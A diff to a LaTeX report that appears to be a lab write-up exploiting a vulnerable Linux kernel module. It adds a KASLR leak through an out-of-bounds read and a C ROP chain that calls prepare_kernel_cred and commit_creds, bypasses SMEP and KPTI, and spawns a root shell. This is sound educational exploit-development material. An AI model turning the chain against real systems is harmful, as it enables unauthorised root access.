@@ -299,7 +299,7 @@
     We managed to overwrite the return address with the value 0x4141414141414141 causing a kernel panic, and having return address control.\newline
     \subsection{Attack plan and Exploit analysis}
     As seen previously we have RIP control, in this section we will see how to do privilege escalation and bypass active mitigations.\newline
-    The goal is to call the following function via a ROP:\newline
+    The goal is to call the following function:\newline
     \begin{verbatim}
         commit_creds(prepare_kernel_cred(NULL));
     \end{verbatim}
@@ -327,4 +327,81 @@ prepare\_kernel\_cred(NULL) creates a new set of credentials with kernel privile
     \begin{verbatim}
         unable to execute userspace code (SMEP?)
     \end{verbatim}
+    So at this point we are forced to ROP, except that kaslr is activated and consequently we cannot call the addresses because they are randomized.\newline
+    The only way to bypass kaslr is to find a leak.\newline
+    At this point the second bug arises: read is vulnerable in the same way as write, in fact you can do read out of bounds, read is vulnerable in the following line of code:\newline
+    \begin{verbatim}
+    if (_copy_to_user(buf, kbuf, count)) {
+        printk(KERN_INFO "copy_to_user failed\n");
+        return -EINVAL;
+  }
+    \end{verbatim}
+   As before, the size of kbuf is defined at 0x400 so if more characters are read, stack data will be leaked.\newline 
+   Follow the code to leak kaslr:\newline
+   \begin{verbatim}
+      read(fd, buf, 0x410);
+      unsigned long addr_vfs_read = *(unsigned long*)&buf[0x408];
+      unsigned long kbase = addr_vfs_read - (0xffffffff8113d33c-0xffffffff81000000);
+      printf("[+] kbase = 0x%016lx\n", kbase);
+   \end{verbatim}
+   To find the libc we will perform this operation : leak - (function\_without\_kaslr - base\_without\_kaslr).\newline
+   At this point we have everything we need to do the privileging escalation steps:\newline
+    \begin{itemize}
+        \item[$\bullet$] Save register state.
+        \item[$\bullet$] Leak kaslr  
+        \item[$\bullet$] write the ROP   
+        \begin{itemize}
+            \item[$\circ$] call kernel creds
+            \item[$\circ$] call commit creds
+            \item[$\circ$] bypass kpti
+            \item[$\circ$] fix the registers cs, rsp, ss, rflags
+            \item[$\circ$] back to user space 
+            \item[$\circ$] pop a shell 
+        \end{itemize}
+    \end{itemize}
+    The only step in this ROP that we have not analyzed is bypassing kpti.
+    As explained previously, this mitigation was implemented mainly for hardware bugs but also at a software level it adds a step to our ROP chain, in fact we will call the   swapgs\_restore\_regs\_and\_return\_usermode function which allows us to set RIP to the win function which will call execve("/bin/sh") and set the registers to reset the stack.\newline
+    Follow the instructions that  
+    swapgs\_restore\_regs\_and\_return\_usermode: \newline
+    \begin{figure}[htbp]
+        \centering
+        \includegraphics[width=1\linewidth]{Images/swapgs_restore_regs_and_return_usermode.png}
+        \caption{function assembly instructions}
+        \label{fig:enter-label}
+    \end{figure}
+    This is what looks like the ROP chain:
+    \begin{verbatim}
+      memset(buf, 'A', 0x408);
+      unsigned long *chain = (unsigned long*)&buf[0x408];
+      *chain++ = rop_pop_rdi;
+      *chain++ = 0;
+      *chain++ = prepare_kernel_cred;
+      *chain++ = rop_pop_rcx;
+      *chain++ = 0;
+      *chain++ = rop_mov_rdi_rax_rep_movsq;
+      *chain++ = commit_creds;
+      *chain++ = rop_bypass_kpti;
+      *chain++ = 0xdeadbeef; // [rdi]
+      *chain++ = 0xdeadbeef;
+      *chain++ = (unsigned long)&win; // [rdi+0x10]
+      *chain++ = user_cs;             // [rdi+0x18]
+      *chain++ = user_rflags;         // [rdi+0x20]
+      *chain++ = user_rsp;            // [rdi+0x28]
+      *chain++ = user_ss;             // [rdi+0x30]
+      puts("[+] Executing ROP ...");
+
+  write(fd, buf, (void*)chain - (void*)buf);
+    \end{verbatim}
+    
+    The last thing left to do is run the full exploit, and see if we get a rooted shell.\newline
+
+    
+    \begin{figure}[htbp]
+        \centering
+        \includegraphics[width=0.5\linewidth]{Images/LPE_kernel_exploit.png}
+        \caption{privilege escalation from unprivilege state}
+        \label{fig:enter-label}
+    \end{figure}
+    We managed to correctly execute an attack that allowed us to do privilege escalation from a non-privileged user, profit!.\newline
+    follow the final exploit: \newline
     
